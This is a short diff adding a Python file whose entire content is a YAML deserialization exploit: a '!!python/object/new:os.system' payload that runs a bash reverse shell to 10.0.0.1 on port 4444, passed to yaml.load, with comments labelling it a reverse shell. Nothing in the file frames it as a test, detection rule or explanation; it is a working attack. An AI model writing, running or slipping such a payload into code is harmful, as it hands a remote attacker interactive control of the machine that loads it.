@@ -1,0 +1,5 @@
+import yaml
+
+# Reverse shell payload
+data = '!!python/object/new:os.system ["bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\""]'
+yaml.load(data)  # Executes the reverse shell
